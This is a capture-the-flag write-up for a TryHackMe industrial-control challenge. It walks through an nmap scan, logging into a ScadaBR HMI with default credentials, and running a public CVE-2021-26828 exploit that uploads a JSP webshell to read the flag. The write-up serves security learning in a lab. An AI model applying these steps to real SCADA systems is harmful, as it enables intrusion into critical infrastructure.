---
layout: default
title: "THM: Brr v1 (Industrial Intrusion CTF 2025)"
date: 2025-06-27
tags: [ctf, tryhackme, scadabr, rce, windows, web, writeup]
---

"A forgotten HMI node deep in Virelia’s wastewater control loop 
still runs an *outdated instance*, 
forked from an old Mango M2M stack."

From the task description, we can start thinking about exploiting
an already discovered vuln within old infrastructure.

## 1. Initial Enumeration
Let's start our enumeration:

```bash
$ nmap 10.10.136.240 -T5    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-27 14:16 MDT
Warning: 10.10.136.240 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.136.240
Host is up (0.12s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5901/tcp open  vnc-1
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 9.55 seconds
```

Since the current category is Web, let's access port 80 and 8080 on our broswer.

> Port 80: *Error response*
> 
Error code: 405
Message: Method Not Allowed.
Error code explanation: 405 - Specified method is invalid for this resource.

> Port 8080: *Successful interaction: redirection to /ScadaBR*
Welcome to ScadaBR CTF
Redirecting you to /ScadaBR...

We are presented with a login screen.

Let's try some default credentials:
admin / admin

Success! 

## 2. Exploitation
Let's try to find some exploit online to gain access to the server hosting ScadaBR.

Looking up "scadabr exploit" on Google returns a working PoC exploit with a reverse shell:
[➡️ POC CVE-2021-26828_ScadaBR_RemoteCodeExecution] (https://github.com/hev0x/CVE-2021-26828_ScadaBR_RCE)


This is quite convenient, since it's an all-in-one package.
Noticed the TTL during pinging was ~64 → probably a Windows host.
Let's use WinScada_RCE.py ...

The Python script is written in Python2, but I modified the script to be able to run it with Python3.
└─$ python3 WinScada_RCE.py 10.10.136.240 8080 admin admin 

## 3. Execution
```bash
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
|    _________                  .___     ____________________       |
|   /   _____/ ____ _____     __| _/____ \______   \______   \      |
|   \_____  \_/ ___\__  \   / __ |\__  \ |    |  _/|       _/       |
|   /        \  \___ / __ \_/ /_/ | / __ \|    |   \|    |   \      |
|  /_______  /\___  >____  /\____ |(____  /______  /|____|_  /      |
|          \/     \/     \/      \/     \/       \/        \/       |
|                                                                   |
|    > ScadaBR 1.0 ~ 1.1 CE Arbitrary File Upload (CVE-2021-26828)  |
|    > Exploit Author : Fellipe Oliveira                            |
|    > Exploit for Windows Systems                                  |
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+

[+] Trying to authenticate http://10.10.136.240:8080/ScadaBR/login.htm...
[+] Successfully authenticated! :D~

[>] Attempting to upload .jsp Webshell...
[>] Verifying shell upload...

[+] Upload Successfuly!
[+] Webshell Found in: http://10.10.136.240:8080/ScadaBR/uploads/1.jsp
[>] Spawning fake shell...
```

We have a reverse shell!

```cmd
# dir

Command: dir
bin  common  conf  logs  root.txt  server  shared  webapps  work

# cat root.txt
Command: cat root.txt
THM{flag}
```
